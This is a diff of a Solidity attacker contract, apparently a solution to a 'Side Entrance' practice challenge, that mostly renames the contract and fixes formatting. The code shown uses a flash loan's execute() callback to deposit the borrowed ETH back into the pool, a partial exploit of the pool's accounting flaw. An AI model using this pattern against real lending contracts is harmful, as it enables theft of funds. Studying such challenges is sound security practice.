@@ -1,3 +1,4 @@
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
 import "@openzeppelin/contracts/utils/Address.sol";
@@ -5,12 +6,13 @@ import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 
 interface IPool {
     function deposit() external payable;
+
     function flashLoan(uint256 amount) external;
+
     function withdraw() external;
 }
 
-contract Attacker {
-
+contract SideEntranceAttacker {
     using Address for address payable;
 
     address payable private pool;
@@ -23,7 +25,7 @@ contract Attacker {
 
     function execute() public payable {
         require(msg.sender == pool, "Sender must be pool");
-        
+
         IPool(pool).deposit{value: msg.value}();
     }
 
@@ -39,5 +41,5 @@ contract Attacker {
     }
 
     // Allow deposits of ETH
-    receive () external payable {}
+    receive() external payable {}
 }
